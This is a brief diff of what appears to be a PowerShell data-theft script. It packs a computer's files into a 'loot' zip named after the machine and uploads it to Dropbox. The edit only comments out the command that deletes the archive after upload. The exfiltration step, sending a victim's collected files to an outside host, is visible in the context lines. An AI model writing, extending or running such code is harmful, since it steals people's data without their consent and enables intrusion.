@@ -25,5 +25,5 @@ if (Test-Path $env:OneDrive) {
 
 if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
     Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
-    Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
+    #Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
 }
